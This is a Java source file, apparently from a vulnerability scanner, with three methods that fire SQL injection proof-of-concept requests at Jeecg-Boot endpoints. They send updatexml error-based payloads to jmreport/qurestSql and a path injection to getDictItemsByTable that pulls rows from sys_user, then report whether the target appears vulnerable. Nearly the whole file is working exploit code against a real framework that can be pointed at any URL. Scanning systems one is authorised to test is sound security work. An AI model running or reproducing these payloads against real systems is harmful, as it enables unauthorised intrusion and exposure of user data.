package com.security.scanner.vulnerabilities;

import com.security.scanner.utils.NetworkUtils;
import com.security.scanner.utils.FileUtils;

public class SqlInjectionVulnerabilities {
    
    public static String testQueryTableDataSqli(String url, String userAgent) {
        String normalizedUrl = NetworkUtils.normalizeUrl(url);
        String formattedDateTime = FileUtils.getCurrentDateTime();
        
        try {
            NetworkUtils.configureSSL();
            String json = "{\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}";
            String response = NetworkUtils.sendPostRequest(normalizedUrl + "/jeecg-boot/jmreport/qurestSql", json, userAgent);
            
            if (response.contains("e10adc3949ba59abbe56e057f20f883e")) {
                return formattedDateTime + url + "[+++]存在jeecg-boot-queryTableData-sqli注入漏洞 poc1\n" + url + "/jeecg-boot/jmreport/qurestSql\n";
            } else {
                return formattedDateTime + url + "[-]不存在jeecg-boot-queryTableData-sqli注入漏洞 poc1\n";
            }
        } catch (Exception e) {
            return formattedDateTime + "[-]不存在jeecg-boot-queryTableData-sqli注入漏洞-poc1\n";
        }
    }

    public static String testGetDictItemsByTableSqli(String url, String userAgent) {
        String normalizedUrl = NetworkUtils.normalizeUrl(url);
        String formattedDateTime = FileUtils.getCurrentDateTime();
        
        try {
            NetworkUtils.configureSSL();
            String response = NetworkUtils.sendGetRequest(normalizedUrl + "/jeecg-boot/sys/ng-alain/getDictItemsByTable/' from sys_user/*, '/x.js", userAgent);
            
            if (response.contains("create_by")) {
                return formattedDateTime + url + "[+++]存在jeecg-boot-getDictItemsByTable-sqli注入漏洞 poc1\n" + url + "/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js\n";
            } else {
                return formattedDateTime + url + "[-]不存在jeecg-boot-getDictItemsByTable-sqli注入漏洞 poc1\n";
            }
        } catch (Exception e) {
            return formattedDateTime + "[-]不存在jeecg-boot-getDictItemsByTable-sqli注入漏洞-poc1\n";
        }
    }

    public static String testQurestSqlSqli(String url, String userAgent) {
        String normalizedUrl = NetworkUtils.normalizeUrl(url);
        String formattedDateTime = FileUtils.getCurrentDateTime();
        
        try {
            NetworkUtils.configureSSL();
            String json = "{\"apiSelectId\":\"1290104038414721025\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}";
            String response = NetworkUtils.sendPostRequest(normalizedUrl + "/jeecg-boot/jmreport/qurestSql", json, userAgent);
            
            if (response.contains("e10adc3949ba59abbe56e057f20f883e")) {
                return formattedDateTime + url + "[+++]可能存在Jeecg-Boot qurestSql-SQL注入漏洞 poc1\n" + url + "/jeecg-boot/jmreport/qurestSql\n";
            } else {
                return formattedDateTime + url + "[-]不存在Jeecg-Boot qurestSql-SQL注入漏洞 poc1\n";
            }
        } catch (Exception e) {
            return formattedDateTime + "[-]不存在Jeecg-Boot qurestSql-SQL注入漏洞-poc1\n";
        }
    }
}
